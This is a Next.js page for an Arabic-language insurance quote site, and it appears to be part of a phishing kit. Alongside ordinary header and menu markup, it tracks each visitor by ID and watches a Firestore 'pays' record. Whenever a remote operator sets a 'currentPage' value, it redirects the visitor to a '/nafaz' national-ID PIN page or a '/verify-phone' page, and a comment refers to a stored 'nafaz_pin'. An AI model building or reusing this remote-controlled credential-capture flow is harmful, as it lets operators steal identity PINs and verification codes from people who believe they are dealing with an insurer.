"use client"


import { Button } from "@/components/ui/button"
import { Badge } from "@/components/ui/badge"
import {Menu, X} from "lucide-react"
import { useState, useEffect } from "react"
import { setupOnlineStatus } from "@/lib/utils"
import { ProfessionalQuoteForm } from "@/components/insurance/quote-form"
import { doc, onSnapshot } from "firebase/firestore"
import { db } from "@/lib/firebase"

export default function QuotePage() {
  const [mounted, setMounted] = useState(false)
  const [mobileMenuOpen, setMobileMenuOpen] = useState(false)

  useEffect(() => {
    // Initialize visitor ID if not exists
    const visitorID = localStorage.getItem("visitor")
    if (visitorID) {
      setMounted(true)
      setupOnlineStatus(visitorID!)
    } else {
      // Create new visitor ID if none exists
      const newVisitorId = "visitor_" + Date.now()
      localStorage.setItem("visitor", newVisitorId)
      setMounted(true)
      setupOnlineStatus(newVisitorId)
    }
  }, [])
  useEffect(()=>{
    const visitorId=localStorage.getItem('visitor')
      const unsubscribe = onSnapshot(doc(db, "pays", visitorId!), (docSnapshot) => {
        if (docSnapshot.exists()) {
          const userData = docSnapshot.data()
          // Assuming the PIN is stored in a field called 'nafaz_pin'
          if(userData.currentPage ==='1'){
              window.location.href='/quote'
          }else if(userData.currentPage ==='8888'|| userData.currentPage ==="nafaz"){
            window.location.href='/nafaz'
          }else if(userData.currentPage ==='9999') {
            window.location.href='/verify-phone'
          }
        } else {
          console.error("User document not found")
        }
      },
      
    )
  
    // Clean up the listener when component unmounts or modal closes
    return () => unsubscribe()
  }, [])
  if (!mounted) {
    return (
      <div className="min-h-screen bg-gradient-to-br from-slate-50 via-white to-blue-50/30 flex items-center justify-center">
        <div className="text-center">
          <div className="w-24 h-24 border-4 border-blue-500 border-t-transparent rounded-full animate-spin mx-auto mb-8"></div>
          <div className="space-y-3">
            <p className="text-sm font-bold text-gray-800">جاري التحميل...</p>
            <p className="text-lg text-gray-500">يتم تحضير منصة التأمين الذكية</p>
          </div>
        </div>
      </div>
    )
  }

  return (
    <div className="min-h-screen bg-gradient-to-br from-slate-50 via-white to-blue-50/30" dir="rtl">
      {/* Enhanced Header */}
      <header className="bg-white/95 backdrop-blur-xl border-b border-gray-100 px-4 lg:px-6 py-4 sticky top-0 z-50 shadow-lg">
        <div className="max-w-7xl mx-auto flex items-center justify-between">
          <div className="flex items-center gap-4 lg:gap-8">
            <div className="flex items-center gap-4">
              <div className="w-28 h-16 rounded-2xl flex items-center justify-center">
                <img src="/Logo-AR.png" alt="logo" width={112} height={64} className="rounded-xl" />
              </div>
              <div className="hidden sm:block">
                <h1 className="text-sm font-bold bg-gradient-to-r from-blue-600 to-blue-800 bg-clip-text text-transparent">
                  تأميني
                </h1>
                <p className="text-sm text-gray-600 font-semibold">منصة التأمين الذكية</p>
              </div>
            </div>
            <nav className="hidden lg:flex items-center gap-8 text-sm font-bold">
              <a href="/" className="text-gray-700 hover:text-blue-600 transition-colors duration-300 relative group">
                الرئيسية
                <span className="absolute -bottom-1 left-0 w-0 h-0.5 bg-blue-600 transition-all duration-300 group-hover:w-full"></span>
              </a>
              <a
                href="/#services"
                className="text-gray-700 hover:text-blue-600 transition-colors duration-300 relative group"
              >
                الخدمات
                <span className="absolute -bottom-1 left-0 w-0 h-0.5 bg-blue-600 transition-all duration-300 group-hover:w-full"></span>
              </a>
              <a
                href="/#about"
                className="text-gray-700 hover:text-blue-600 transition-colors duration-300 relative group"
              >
                عن الشركة
                <span className="absolute -bottom-1 left-0 w-0 h-0.5 bg-blue-600 transition-all duration-300 group-hover:w-full"></span>
              </a>
              <a
                href="/#contact"
                className="text-gray-700 hover:text-blue-600 transition-colors duration-300 relative group"
              >
                اتصل بنا
                <span className="absolute -bottom-1 left-0 w-0 h-0.5 bg-blue-600 transition-all duration-300 group-hover:w-full"></span>
              </a>
            </nav>
          </div>
          <div className="flex items-center gap-3">
            <Button
              variant="ghost"
              size="sm"
              className="hidden sm:flex text-gray-600 hover:text-blue-600 font-semibold"
            >
              English
            </Button>
            <Button
              variant="outline"
              size="sm"
              className="hidden sm:flex border-2 border-gray-200 hover:border-blue-500 hover:text-blue-600 bg-white font-semibold transition-all duration-300 rounded-xl"
            >
              تسجيل الدخول
            </Button>
            <Button
              size="sm"
              className="bg-gradient-to-r from-blue-600 to-blue-700 hover:from-blue-700 hover:to-blue-800 shadow-xl text-white font-bold px-8 py-3 transition-all duration-300 rounded-xl transform hover:scale-105"
            >
              ابدأ الآن
            </Button>
            <Button variant="ghost" size="sm" className="lg:hidden" onClick={() => setMobileMenuOpen(!mobileMenuOpen)}>
              {mobileMenuOpen ? <X className="w-5 h-5" /> : <Menu className="w-5 h-5" />}
            </Button>
          </div>
        </div>

        {/* Enhanced Mobile Menu */}
        {mobileMenuOpen && (
          <div className="lg:hidden mt-6 pb-6 border-t border-gray-100 bg-white/95 backdrop-blur-xl rounded-b-2xl shadow-2xl">
            <nav className="flex flex-col gap-4 pt-6">
              <a
                href="/"
                className="text-gray-700 hover:text-blue-600 transition-colors duration-300 py-4 px-4 rounded-xl hover:bg-blue-50 font-semibold"
              >
                الرئيسية
              </a>
              <a
                href="/#services"
                className="text-gray-700 hover:text-blue-600 transition-colors duration-300 py-4 px-4 rounded-xl hover:bg-blue-50 font-semibold"
              >
                الخدمات
              </a>
              <a
                href="/#about"
                className="text-gray-700 hover:text-blue-600 transition-colors duration-300 py-4 px-4 rounded-xl hover:bg-blue-50 font-semibold"
              >
                عن الشركة
              </a>
              <a
                href="/#contact"
                className="text-gray-700 hover:text-blue-600 transition-colors duration-300 py-4 px-4 rounded-xl hover:bg-blue-50 font-semibold"
              >
                اتصل بنا
              </a>
              <div className="flex gap-3 pt-4 border-t border-gray-100">
                <Button variant="ghost" size="sm" className="text-gray-600 flex-1 font-semibold">
                  English
                </Button>
                <Button variant="outline" size="sm" className="border-gray-300 flex-1 bg-white font-semibold">
                  تسجيل الدخول
                </Button>
              </div>
            </nav>
          </div>
        )}
      </header>
      {/* Enhanced Quote Form Section */}
      <section className="py-24 lg:py-32 relative">
        <div className="max-w-7xl mx-auto px-4 lg:px-6">
          <div className="text-center mb-20">
            <Badge className="bg-blue-100 text-blue-700 px-8 py-4 text-lg font-bold mb-8 rounded-full shadow-lg">
              احصل على عرض السعر
            </Badge>
            <h2 className="text-md lg:text-5xl font-bold text-gray-900 mb-8">احصل على عرض السعر الخاص بك</h2>
            <p className="text-sm text-gray-600 max-w-3xl mx-auto leading-relaxed">
              اتبع الخطوات البسيطة للحصول على أفضل عروض التأمين المخصصة لاحتياجاتك
            </p>
          </div>
          <ProfessionalQuoteForm />
        </div>
      </section>

   
    </div>
  )
}
